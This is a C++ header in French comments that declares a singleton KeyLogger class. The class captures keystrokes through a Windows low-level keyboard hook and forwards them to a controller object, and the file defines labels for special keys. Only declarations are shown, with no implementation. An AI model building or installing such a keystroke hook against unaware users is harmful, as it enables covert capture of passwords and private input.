/*!
* \file KeyLogger.h
* Fichier entête de la classe KeyLogger.
* Contient aussi les constantes des chaines de caractères des touches spéciales.
* \date 09/11/2008
* \author Xavier Monin
*/

#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_

class Controleur;

#include <windows.h>
#include <string>

// Liste des touches spéciales
#define F1				"[F1]";
#define F2				"[F2]";
#define F3				"[F3]";
#define F4				"[F4]";
#define F5				"[F5]";
#define F6				"[F6]";
#define F7				"[F7]";
#define F8				"[F8]";
#define F9				"[F9]";
#define F10				"[F10]";
#define F11				"[F11]";
#define F12				"[F12]";

#define CTRL_G_PRESSE	"<Ctrl_G>";
#define CTRL_D_PRESSE	"<Ctrl_D>";
#define CTRL_G_RELACHE	"</Ctrl_G>";
#define CTRL_D_RELACHE	"</Ctrl_D>";

#define WINDOWS_G		"[Windows_G]";
#define WINDOWS_D		"[Windows_D]";

#define INSER			"[Inser]";
#define SUPPR			"[Suppr]";
#define DEBUT			"[Debut]";
#define FIN				"[Fin]";
#define PAGE_HAUT		"[Page_Haut]";
#define PAGE_BAS		"[Page_Bas]";
			
#define TAB				"[Tab]";

#define EFFACER			"[ <- ]";
#define ENTREE			"[Entree]";
			
#define ESC				"[Echap]";
#define VERR_NUM		"[Numlock]";
#define ATTN			"[Attn]";

#define MENU			"[Menu]";
			
#define GAUCHE			"[Gauche]";
#define HAUT			"[Haut]";
#define DROITE			"[Droite]";
#define BAS				"[Bas]";
#define SELECT			"[Select]";
#define EXECUTER		"[Execute]";

#define IMPR_ECRAN		"[Imp_ecran]";
#define VERR_DEF		"[Verr_Defil]";
#define PAUSE			"[Pause]";

#define ALT_PRESSE		"<Alt>";
#define ALT_RELACHE		"</Alt>";



/*!
* \class KeyLogger
* \brief Capte les touches du clavier.
* Les touches tapées au clavier sont envoyées à un objet Controleur.
* Cette classe est un singleton.
* \author Xavier Monin
*/
class KeyLogger
{
public:	
	static KeyLogger* instancier();
	static void liberer();

	void demarrer();
	void arreter();

	void definirControleur(Controleur* envoi);

private:
	KeyLogger();
	~KeyLogger();

	static DWORD WINAPI threadKeyLogger(LPVOID inutilise);
	static __declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam );
	static void MsgLoop();

	static void envoyerDonnees(const std::string&);

	static std::string touchePressee(KBDLLHOOKSTRUCT hooked);

	//! Hook clavier
	static HHOOK hKeyHook;

	//! Thread de capture des touches
	static HANDLE hThread;

	//! Les touches émises seront transmises à l'objet envoyer
	static Controleur* envoyer;
	//! Etat du thread de capture
	static bool en_cours;

	//! Objet courant et unique KeyLogger
	static KeyLogger* instance;
};

#endif